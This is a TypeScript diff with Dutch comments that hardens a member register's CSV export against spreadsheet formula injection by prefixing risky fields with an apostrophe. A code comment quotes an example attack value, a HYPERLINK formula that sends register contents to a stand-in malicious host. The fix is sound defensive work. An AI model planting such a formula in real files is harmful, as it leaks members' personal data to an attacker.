@@ -46,8 +46,19 @@ export function alleLeden(db: DatabaseSync): Lid[] {
   return (rijen as Rij[]).map(naarLid);
 }
 
+// Een veld dat begint met =, +, -, @, een tab of een carriage return laat
+// Excel/LibreOffice het als formule uitvoeren zodra de aanhalingstekens
+// eromheen bij het openen worden weggehaald (CSV-formule-injectie): een naam
+// als `=HYPERLINK("https://kwaadaardig/"&A1,"klik")` kan zo het hele
+// register naar een aanvaller lekken zodra een bestuurslid het bestand opent.
+// Een voorafgaande apostrof voorkomt dat zonder de zichtbare tekst te raken.
+const FORMULE_START = /^[=+\-@\t\r]/;
+
 /** Een naam mag komma's en aanhalingstekens bevatten; die mogen geen kolom opschuiven. */
-const veld = (w: string): string => `"${w.replace(/"/g, '""')}"`;
+const veld = (w: string): string => {
+  const beveiligd = FORMULE_START.test(w) ? `'${w}` : w;
+  return `"${beveiligd.replace(/"/g, '""')}"`;
+};
 
 export function alsCsv(leden: Lid[]): string {
   const kop = "naam,email,status,aangemeld_op";
